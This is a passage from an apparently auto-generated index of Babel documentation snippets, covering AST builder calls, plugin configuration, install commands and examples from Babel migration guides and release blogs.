} },\n);\n```\n\n----------------------------------------\n\nTITLE: Deprecated codeFrame usage\nDESCRIPTION: Example of the deprecated `codeFrame` API (prior to version 7) with line number and column pointer, now replaced by `codeFrameColumns` with a location object.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport codeFrame from \"@babel/code-frame\";\n\nconst rawLines = `class Foo {\\n  constructor()\\n}`;\nconst lineNumber = 2;\nconst colNumber = 16;\n\nconst result = codeFrame(rawLines, lineNumber, colNumber, {\n  /* options */\n});\n\nconsole.log(result);\n```\n\n----------------------------------------\n\nTITLE: Configuration with Exact Globals JSON\nDESCRIPTION: This JSON config enables exactGlobals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_10\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"globals\": {\n    \"foo-bar\": \"fooBAR\",\n    \"./mylib/foo-bar\": \"mylib.fooBar\"\n  },\n  \"exactGlobals\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring babel-preset-flow - JSON\nDESCRIPTION: This shows the configuration for the new `babel-preset-flow`. Instead of manually adding the `transform-flow-strip-types` plugin, you can now use the `flow` preset.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"transform-flow-strip-types\"]\n}\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"flow\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Plugin - Shell\nDESCRIPTION: This command installs the @babel/plugin-syntax-explicit-resource-management plugin as a development dependency using npm. It is a prerequisite for using the plugin in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-explicit-resource-management.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-explicit-resource-management\n```\n\n----------------------------------------\n\nTITLE: Destructuring Private Fields in Babel 8\nDESCRIPTION: Illustrates destructuring private fields within Babel 8. This enables extracting private class members using destructuring syntax within methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nclass Example { #x = 1; method() { const { #x: x } = this; } }\n```\n\n----------------------------------------\n\nTITLE: Creating a DirectiveLiteral AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.directiveLiteral` to create a directive literal node in the AST. It takes a string representing the literal value of the directive.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_46\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.directiveLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: Dynamic Module Loading JavaScript\nDESCRIPTION: This code demonstrates dynamic module loading using `System.import`.  It loads the `lib/math` module asynchronously and then uses the imported members. It requires the System module loader (polyfill). It outputs an alert with the value of `2π`.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Dynamic loading – ‘System’ is default loader\nSystem.import(\"lib/math\").then(function(m) {\n  alert(\"2π = \" + m.sum(m.pi, m.pi));\n});\n```\n\n----------------------------------------\n\nTITLE: Creating an EmptyTypeAnnotation AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.emptyTypeAnnotation` to create an empty type annotation node in the AST for Flow. It takes no arguments and represents the `empty` type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_50\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.emptyTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Configure plugin with options (Babel 7)\nDESCRIPTION: Shows how to configure the @babel/plugin-transform-react-jsx-development plugin in a babel.config.json file with custom options such as `throwIfNamespace`, `runtime`, and `importSource`. Note the different default runtime between Babel 7 and 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-react-jsx-development\",\n      {\n        \"throwIfNamespace\": false, // defaults to true\n        \"runtime\": \"automatic\", // defaults to classic\n        \"importSource\": \"custom-jsx-library\" // defaults to react\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Connect with npm\nDESCRIPTION: This command installs the babel-connect package using npm. npm is a package manager for Node.js. The install command downloads and installs the specified package and its dependencies into the node_modules directory.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/connect/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-connect\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Output Code\nDESCRIPTION: This example shows the output JavaScript code after the transformation. The strict equality operator (===) has been replaced with the non-strict equality operator (==).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\ntypeof foo == \"object\";\n```\n\n----------------------------------------\n\nTITLE: Install jstransformer-babel with npm\nDESCRIPTION: This command installs the `jstransformer-babel` package using npm. It ensures that the package and its dependencies are downloaded and installed into the project's `node_modules` directory. This package is designed to work with Babel 6.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/pug/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install jstransformer-babel\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the @babel/plugin-transform-object-set-prototype-of-to-assign plugin in a babel.config.json file.  This is the recommended way to configure Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-object-set-prototype-of-to-assign\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Block Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `Block` node using `t.isBlock(node)`. This is a deprecated alias for checking `BlockStatement`, `Program`, and `TSModuleBlock` nodes and will be removed in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_255\n\nLANGUAGE: javascript\nCODE:\n```\nt.isBlock(node);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Preset Stage 2 via CLI\nDESCRIPTION: Example of using the `@babel/preset-stage-2` preset with the Babel CLI to transpile a JavaScript file. Stage presets are deprecated.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-2.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbabel script.js --presets @babel/preset-stage-2\n```\n\n----------------------------------------\n\nTITLE: JavaScript Equivalent of Mallet Operator\nDESCRIPTION: Shows the equivalent if statement that replicates the behavior of the Mallet operator (||=) in JavaScript. This highlights the conditional assignment based on a falsy check.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-01-27-2to3.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nif (!a) a = b;\n```\n\n----------------------------------------\n\nTITLE: Installing ES2015 Constants and Block Scoping Plugins\nDESCRIPTION: Installs `babel-plugin-check-es2015-constants` and `babel-plugin-transform-es2015-block-scoping` as development dependencies via npm. These plugins are needed to compile ES2015 constants and block scoping features to ES5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-plugin-check-es2015-constants\n$ npm install --save-dev babel-plugin-transform-es2015-block-scoping\n```\n\n----------------------------------------\n\nTITLE: Creating an OptionalIndexedAccessType in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `OptionalIndexedAccessType` AST node using `t.optionalIndexedAccessType(objectType, indexType)`. It represents an optional indexed access type in Flow. Parameters include the object type, index type, and an optional flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_134\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.optionalIndexedAccessType(objectType, indexType);\n```\n\n----------------------------------------\n\nTITLE: Regex with Disabled Runtime (JavaScript)\nDESCRIPTION: Example of regular expression where runtime is disabled. This supports internal group references but not runtime properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar stringRe = /(?:(?<quote>\")|(?<quote>')).*?\\k<quote>/;\\n\nstringRe.test(\"'foo'\"); // \"true\", works\\nstringRe.exec(\"'foo'\").groups.quote; // undefined\n```\n\n----------------------------------------\n\nTITLE: Class Property Initialization JavaScript Example\nDESCRIPTION: Illustrates the usage of class property initializers, a stage 0 ES7 proposal, to define properties directly within a class. It demonstrates the syntax for instance and static properties and includes assertions to verify their values.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  firstName = \"Sebastian\";\n  static lastName = \"McKenzie\";\n}\n\nassert(new Person().firstName, \"Sebastian\");\nassert(Person.lastName, \"McKenzie\");\n```\n\n----------------------------------------\n\nTITLE: Records and Tuples Polyfill\nDESCRIPTION: HTML snippet to include the `@bloomberg/record-tuple-polyfill` in a web page. This polyfill is required because no engine currently supports Records and Tuples natively.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<script src=\"https://unpkg.com/@bloomberg/record-tuple-polyfill@0.0.3/lib/index.umd.js\" />\n```\n\n----------------------------------------\n\nTITLE: BooleanTypeAnnotation Output (JavaScript)\nDESCRIPTION: This example demonstrates the change in babel-generator's output for the `BooleanTypeAnnotation` AST node, now using `boolean` instead of `bool`. The change ensures consistency with standard JavaScript type annotations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a: Promise<boolean>[];\n// instead of\nvar a: Promise<bool>[];\n```\n\n----------------------------------------\n\nTITLE: Transpile JavaScript with Babel and Source Maps using Gulp\nDESCRIPTION: This snippet shows how to generate source maps using gulp-sourcemaps in conjunction with gulp-babel.  It reads all JavaScript files in the 'src' directory, initializes source map generation, transpiles the code with Babel using the default configuration, concatenates all files into 'all.js', writes the source maps to the '.' directory, and outputs the final bundle to the 'dist' directory. Requires gulp-sourcemaps, gulp-babel and gulp-concat.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/gulp/usage.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar gulp = require(\"gulp\");\nvar sourcemaps = require(\"gulp-sourcemaps\");\nvar babel = require(\"gulp-babel\");\nvar concat = require(\"gulp-concat\");\n\ngulp.task(\"default\", function () {\n  return gulp.src(\"src/**/*.js\")\n    .pipe(sourcemaps.init())\n    .pipe(babel())\n    .pipe(concat(\"all.js\"))\n    .pipe(sourcemaps.write(\".\"))\n    .pipe(gulp.dest(\"dist\"));\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a TSDeclareFunction Node in JavaScript\nDESCRIPTION: This example illustrates how to create a `TSDeclareFunction` AST node using the `t.tsDeclareFunction` builder. This function takes an identifier, type parameters, parameters, and a return type as arguments. This node represents a function declaration in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_167\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsDeclareFunction(id, typeParameters, params, returnType);\n```\n\n----------------------------------------\n\nTITLE: Creating a TS BigInt Keyword Node in Babel\nDESCRIPTION: Creates a `TSBigIntKeyword` AST node using the Babel types module. This node represents the `bigint` keyword in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_161\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsBigIntKeyword();\n```\n\n----------------------------------------\n\nTITLE: Object Rest Destructuring: Output JavaScript\nDESCRIPTION: This JavaScript code shows the output of object rest destructuring assignment after transformation using `useBuiltIns`. The object rest is transformed to use `Object.assign`. This example is meant to show how the `useBuiltIns` option modifies the output.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _z = z,\n  x = Object.assign({}, _z);\n```\n\n----------------------------------------\n\nTITLE: Fix Type Parameters Arrow Function JavaScript\nDESCRIPTION: Illustrates a fix for stripping `typeParameters` from arrow functions. Before this fix, type parameters in arrow functions were not being correctly removed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\n// <X> wasn't stripped out\nconst find = <X> (f: (x:X) => X, xs: Array<X>): ?X => (\n  xs.reduce(((b, x) => b ? b : f(x) ? x : null), null)\n)\n```\n\n----------------------------------------\n\nTITLE: Node API: Babel Plugin Usage\nDESCRIPTION: This JavaScript snippet shows how to use the babel-plugin-minify-mangle-names plugin programmatically via the Babel Node API.  It transforms the string \"code\" using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-mangle-names\"]\n});\n```\n\n----------------------------------------\n\nTITLE: output2.js v6 and v7 file example\nDESCRIPTION: Shows the output of input2.js file being processed by Babel v6 and v7. Both Babel v6 and v7 automatically inject 'use strict' and rewrite the import.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n// output.js v6 and v7\n\"use strict\";\nrequire(\"a\");\n```\n\n----------------------------------------\n\nTITLE: Experimental Babel 8 Implementation\nDESCRIPTION: This snippet shows how to use the experimental worker implementation. It internally runs Babel asynchronously, so it's compatible with .mjs configuration files.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register/experimental-worker\");\n```\n\n----------------------------------------\n\nTITLE: JavaScript Mallet Operator Example\nDESCRIPTION: Explains the Mallet operator (||=) and its equivalent if statement in JavaScript. The Mallet operator assigns a value conditionally based on the falsy-ness of the existing value.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-01-27-2to3.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\na ||= b\n```\n\n----------------------------------------\n\nTITLE: Creating a ThisExpression Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `ThisExpression` AST node using Babel's `t.thisExpression` method. It takes no arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_228\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.thisExpression();\n```\n\n----------------------------------------\n\nTITLE: JavaScript: F# Pipeline Operator Example\nDESCRIPTION: This snippet demonstrates the F# pipeline operator. It transforms `person.score` by doubling it, adding 7, and bounding the result between 0 and 100, using arrow functions for each step.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = person.score\n  |> double\n  |> n => add(7, n)\n  |> n => boundScore(0, 100, n);\n\n```\n\n----------------------------------------\n\nTITLE: Transformed Module with Complex Globals JavaScript\nDESCRIPTION: This JavaScript show the transformation with complex globals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nfactory(mod.exports);\nglobal.My = global.My || {};\nglobal.My.Custom = global.My.Custom || {};\nglobal.My.Custom.Module = global.My.Custom.Module || {};\nglobal.My.Custom.Module.Name = mod.exports;\n```\n\n----------------------------------------\n\nTITLE: Minifying JavaScript with gulp-babel-minify in Gulp\nDESCRIPTION: This example demonstrates how to create a Gulp task that uses gulp-babel-minify to minify a JavaScript file. It reads the file from the `./build/app.js` path, minifies it using the provided options (keeping class names), and outputs the result to the `./dist` directory.  Requires `gulp` and `gulp-babel-minify` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/gulp-babel-minify.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst gulp = require(\"gulp\");\nconst minify = require(\"gulp-babel-minify\");\n\ngulp.task(\"minify\", () =>\n  gulp.src(\"./build/app.js\")\n    .pipe(minify({\n      mangle: {\n        keepClassName: true\n      }\n    }))\n    .pipe(gulp.dest(\"./dist\"));\n);\n```\n\n----------------------------------------\n\nTITLE: Creating an ArrayPattern Node\nDESCRIPTION: Creates an AST node representing an array pattern. Requires the `elements` parameter, which is an array of `null | PatternLike | LVal`. Use `t.isArrayPattern(node, opts)` to check if a node is an ArrayPattern and `t.assertArrayPattern(node, opts)` to assert that a node is an ArrayPattern.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.arrayPattern(elements);\n```\n\n----------------------------------------\n\nTITLE: Creating Labeled Statement in JavaScript\nDESCRIPTION: This snippet shows how to create a `LabeledStatement` AST node using Babel's `t.labeledStatement` builder. It requires a `label` (Identifier) and a `body` (Statement).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_108\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.labeledStatement(label, body);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babelify Options in package.json (JSON)\nDESCRIPTION: This JSON snippet illustrates how to configure Babelify options directly within the `package.json` file. It specifies Babelify as a transform and sets the `comments` option to `false`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/usage.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"transform\": [[\"babelify\", { \"comments\": false }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Arrow Function (JavaScript)\nDESCRIPTION: This JavaScript code defines an arrow function. The `noNewArrows` assumption, which defaults to true, tells Babel that arrow functions are never instantiated using `new`.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet getSum = (a, b) => {\n  return { sum: a + b }\n};\n```\n\n----------------------------------------\n\nTITLE: Babel 5 Plugin API example\nDESCRIPTION: This is the old Babel 5 plugin API. It demonstrates how a plugin was defined, returning a new `Plugin` instance with a visitor object that defines how to transform the AST. The `types` object provides utilities for creating and checking AST nodes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-29-6.0.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default function({ Plugin, types: t }) {\n  return new Plugin(‘ast-transform’, {\n    visitor: { … }\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Mapped Type\nDESCRIPTION: Creates a TypeScript mapped type node in the AST. Mapped types are used to create new types based on existing ones, often used with utility types like `Partial` or `Readonly`. Requires a type parameter and accepts optional type annotation and name type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_187\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsMappedType(typeParameter, typeAnnotation, nameType);\n```\n\n----------------------------------------\n\nTITLE: Invalid Nullish Coalescing Operator Usage in JavaScript\nDESCRIPTION: This code snippet shows examples of invalid expressions that mix the nullish coalescing operator (`??`) with logical operators (`&&` and `||`) without explicit parentheses.  The specification update requires parentheses to clarify precedence when mixing these operators. These expressions will now cause errors during parsing.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-09-05-7.6.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\na ?? b || c;\na && b ?? c;\n```\n\n----------------------------------------\n\nTITLE: Invalid Object Rest Spread Usage - JavaScript\nDESCRIPTION: This code snippet demonstrates disallowed usage of object rest spread, specifically destructuring rest within an object or array literal.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar { ...{ x } } = obj;\nvar { ...[ y ] } = obj;\n```\n\n----------------------------------------\n\nTITLE: Transforming For-Await Statements JavaScript\nDESCRIPTION: Illustrates how Babel transforms `for-await` statements into regular for loops with yield expressions. This is part of the async iteration proposal implementation. The example defines an async function `f` that iterates over an async iterable `y`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function f() {\n  for await (let x of y) {\n    g(x);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Configuration Error Example\nDESCRIPTION: This Javascript snippet illustrates an error case in Babel configuration, where the same plugin is used twice without a name. Babel interprets this as redundant and throws an error because the second instance would simply overwrite the first.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nplugins: [\"./plug\", \"./plug\"];\n```\n\n----------------------------------------\n\nTITLE: Checking for Method Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a method, either within an object or a class. It uses the `t.isMethod(node)` method from Babel's `types` API. This covers nodes such as `ClassMethod`, `ClassPrivateMethod`, and `ObjectMethod`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_281\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isMethod(node);\n```\n\n----------------------------------------\n\nTITLE: Core-js v2 Polyfill Imports\nDESCRIPTION: A comprehensive list of Stage < 3 proposal polyfills in core-js v2. Demonstrates the import statements required to use these polyfills individually after the deprecation of stage presets in Babel 7.  It includes polyfills for various features from different stages, including string, array, global, math, and collection constructors.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// core-js v2\n\n// Stage 3\nimport \"core-js/fn/string/trim-left\";\nimport \"core-js/fn/string/trim-right\";\nimport \"core-js/fn/string/match-all\";\nimport \"core-js/fn/array/flat-map\";\nimport \"core-js/fn/array/flatten\"; // RENAMED\nimport \"core-js/fn/global\";\n\n// Stage 1\nimport \"core-js/fn/symbol/observable\";\nimport \"core-js/fn/promise/try\";\nimport \"core-js/fn/observable\";\n\n// Stage 1 Math Extensions\nimport \"core-js/fn/math/clamp\";\nimport \"core-js/fn/math/deg-per-rad\";\nimport \"core-js/fn/math/degrees\";\nimport \"core-js/fn/math/fscale\";\nimport \"core-js/fn/math/iaddh\";\nimport \"core-js/fn/math/isubh\";\nimport \"core-js/fn/math/imulh\";\nimport \"core-js/fn/math/rad-per-deg\";\nimport \"core-js/fn/math/radians\";\nimport \"core-js/fn/math/scale\";\nimport \"core-js/fn/math/umulh\";\nimport \"core-js/fn/math/signbit\";\n\n// Stage 1 \"of and from on collection constructors\"\nimport \"core-js/fn/map/of\";\nimport \"core-js/fn/set/of\";\nimport \"core-js/fn/weak-map/of\";\nimport \"core-js/fn/weak-set/of\";\nimport \"core-js/fn/map/from\";\nimport \"core-js/fn/set/from\";\nimport \"core-js/fn/weak-map/from\";\nimport \"core-js/fn/weak-set/from\";\n\n// Stage 0\nimport \"core-js/fn/string/at\";\n\n// Nonstandard\nimport \"core-js/fn/object/define-getter\";\nimport \"core-js/fn/object/define-setter\";\nimport \"core-js/fn/object/lookup-getter\";\nimport \"core-js/fn/object/lookup-setter\";\n// import \"core-js/fn/map/to-json\"; // Not available standalone\n// import \"core-js/fn/set/to-json\"; // Not available standalone\n\nimport \"core-js/fn/system/global\";\nimport \"core-js/fn/error/is-error\";\nimport \"core-js/fn/asap\";\n\n// Decorator metadata? Not sure of stage/proposal\nimport \"core-js/fn/reflect/define-metadata\";\nimport \"core-js/fn/reflect/delete-metadata\";\nimport \"core-js/fn/reflect/get-metadata\";\nimport \"core-js/fn/reflect/get-metadata-keys\";\nimport \"core-js/fn/reflect/get-own-metadata\";\nimport \"core-js/fn/reflect/get-own-metadata-keys\";\nimport \"core-js/fn/reflect/has-metadata\";\nimport \"core-js/fn/reflect/has-own-metadata\";\nimport \"core-js/fn/reflect/metadata\";\n```\n\n----------------------------------------\n\nTITLE: CallExpression AST (Babel 8)\nDESCRIPTION: Babel 8 AST for CallExpression, using `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_28\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"CallExpression\",\n  \"callee\": Identifier(\"fn\"),\n  \"arguments\": [],\n  \"typeArguments\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Function Bind Syntax in Babel 8\nDESCRIPTION: Illustrates the function bind syntax (::) in Babel 8 for binding a function to an object or context.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\na::b\n```\n\nLANGUAGE: javascript\nCODE:\n```\n::console.log\n```\n\n----------------------------------------\n\nTITLE: Module Export (JavaScript)\nDESCRIPTION: This JavaScript code exports a variable. The `noIncompleteNsImportDetection` assumption affects how Babel handles namespace imports by assuming that no own property of a module export object is observed before initialization.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport var foo;\n```\n\n----------------------------------------\n\nTITLE: Use babel-plugin-transform-minify-booleans via Node API\nDESCRIPTION: Uses the Babel Node API to transform JavaScript code with the transform-minify-booleans plugin.\nRequires: @babel/core package. Input: JavaScript code string and plugin configuration. Output: Transformed JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-minify-booleans.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-minify-booleans\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Create Interface Extends AST Node (JavaScript)\nDESCRIPTION: Creates an `InterfaceExtends` AST node using the `t.interfaceExtends` builder. This node represents an extended interface in Flow. Parameters include the identifier of the extended interface and any type parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_89\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.interfaceExtends(id, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Transpiler via Gem\nDESCRIPTION: This command installs the Babel transpiler using the Ruby gem package manager. It is likely a required step to set up the Babel website development environment and ensure the transpiler is available.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/ruby/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngem install babel-transpiler\n```\n\n----------------------------------------\n\nTITLE: Checking for Literal Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a literal, regular expression literal, or template literal. It uses the `t.isLiteral(node)` method from Babel's `types` API. This covers nodes like `StringLiteral`, `NumericLiteral`, `BooleanLiteral`, `NullLiteral`, `RegExpLiteral`, and `TemplateLiteral`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_279\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isLiteral(node);\n```\n\n----------------------------------------\n\nTITLE: Install Plugin\nDESCRIPTION: Command to install the @babel/plugin-transform-json-modules plugin using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-json-modules\n```\n\n----------------------------------------\n\nTITLE: Create Interface Type Annotation AST Node (JavaScript)\nDESCRIPTION: Creates an `InterfaceTypeAnnotation` AST node using the `t.interfaceTypeAnnotation` builder.  This node represents an interface type annotation in Flow.  Parameters include extended interfaces and the object type body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_90\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.interfaceTypeAnnotation(extends, body);\n```\n\n----------------------------------------\n\nTITLE: TSConstructSignatureDeclaration AST (Babel 7)\nDESCRIPTION: Babel 7 AST for TSConstructSignatureDeclaration, using `parameters` and `typeAnnotation`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_15\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSConstructSignatureDeclaration\",\n  \"parameters\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"typeAnnotation\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Invalid JavaScript Examples Reported by @babel/parser\nDESCRIPTION: Examples of invalid JavaScript code that `@babel/parser` now correctly identifies as errors, including duplicate declarations, undeclared exports, invalid `super()` calls, and duplicate parameters. Requires `@babel/parser`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet a, a; // Duplicate declaration 💥\n\nif (foo) {\n  if (bar) { var b }\n  let b; // Duplicate declaration, again 💥\n}\n\nexport { Foo }; // Error, Foo is not declared ❓\n\nclass C {\n  constructor() {\n    super(); // Super in a non-derived class 🤔\n  }\n\n  method(d, d) {} // Duplicate parameter 💥\n}\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Element in JavaScript\nDESCRIPTION: This snippet creates a `JSXElement` AST node using Babel's `t.jsxElement` builder. It requires `openingElement` (JSXOpeningElement), `closingElement` (JSXClosingElement, optional, defaults to null), `children` (array of JSXText, JSXExpressionContainer, JSXSpreadChild, JSXElement, or JSXFragment), and `selfClosing` (boolean, optional, defaults to null).\nSOURCE: 